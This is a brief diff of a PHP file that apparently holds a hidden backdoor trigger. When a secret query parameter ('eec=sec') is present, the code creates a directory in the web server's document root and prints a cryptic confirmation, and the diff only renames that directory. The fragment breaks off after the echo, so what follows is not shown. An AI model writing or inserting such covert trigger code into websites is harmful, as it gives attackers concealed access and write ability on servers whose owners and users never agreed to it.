@@ -1,6 +1,6 @@
 <?php 
 if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ 
-mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
+mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-s");
 echo('Eec secra');  
 
 
